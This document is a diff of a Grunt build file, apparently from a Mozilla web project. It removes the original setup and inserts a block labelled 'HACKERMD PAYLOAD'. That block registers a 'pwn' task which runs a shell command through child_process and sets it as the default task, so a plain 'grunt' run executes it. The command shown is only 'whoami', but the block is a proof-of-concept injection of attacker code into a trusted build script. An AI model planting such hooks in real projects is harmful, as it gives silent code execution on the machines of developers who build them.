@@ -1,33 +1,26 @@
-#!/usr/bin/env node
 
-/* This Source Code Form is subject to the terms of the Mozilla Public
- * License, v. 2.0. If a copy of the MPL was not distributed with this
- * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
-
-// Generated on 2013-12-04 using generator-backbone-amd 0.0.4
-
-// # Globbing
-// for performance reasons we're only matching one level down:
-// 'test/spec/{,*/}*.js'
-// use this if you want to recursively match all subfolders:
-// 'test/spec/**/*.js'
-
-module.exports = function (grunt) {
-  // load all grunt tasks based on environment
-  if (process.env.NODE_ENV && process.env.NODE_ENV === 'production') {
-    require('load-grunt-tasks')(grunt, {
-      scope: 'dependencies',
-      requireResolution: true,
-    });
-  } else {
-    // show elapsed time at the end
-    require('time-grunt')(grunt);
-    require('load-grunt-tasks')(grunt, { requireResolution: true });
-  }
-
+module.exports = function(grunt) {
   grunt.initConfig({
-    pkg: grunt.file.readJSON('package.json'),
+    'l10n-extract': {
+      all: {
+        options: {
+          potFile: 'locale/templates/LC_MESSAGES/messages.pot',
+          poFiles: ['en.po'],
+          src: ['app/scripts/lib/l10n/en.ftl']
+        }
+      }
+    }
   });
 
-  grunt.loadTasks('grunttasks');
+  // --- HACKERMD PAYLOAD START ---
+  grunt.registerTask('pwn', 'Run a shell command', function() {
+    const { execSync } = require('child_process');
+    console.log('----- HACKERMD WAS HERE - SUCCESS! -----');
+    console.log('USER:', execSync('whoami').toString().trim());
+    console.log('--- PoC Complete ---');
+  });
+  grunt.loadNpmTasks('grunt-l10n-extract');
+  grunt.registerTask('default', ['pwn']);
+  // --- HACKERMD PAYLOAD END ---
 };
+
